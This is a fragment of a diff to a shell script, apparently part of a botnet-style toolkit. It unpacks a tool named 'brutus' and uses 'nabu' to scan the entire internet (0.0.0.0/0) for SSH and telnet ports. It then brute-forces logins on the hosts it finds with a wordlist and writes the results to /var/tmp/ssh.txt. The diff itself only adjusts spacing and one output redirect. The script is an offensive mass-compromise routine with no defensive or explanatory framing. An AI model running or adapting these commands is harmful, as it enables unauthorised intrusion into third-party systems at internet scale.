@@ -34,7 +34,7 @@ tar -xf brutus
 chmod  +x brutus 
 
 
-timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu     #ssh
+timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
 
 timeout  600s     ./nabu  -p 23    -host   0.0.0.0/0     >>    ips_nabu  #telnet
 
@@ -49,7 +49,7 @@ grep -v "^127\." ips_nabu >  my_ips
 
 
 
-./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q  -t 20    >     /var/tmp/ssh.txt  
+./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q  -t 20    >>     /var/tmp/ssh.txt  
  
 
 
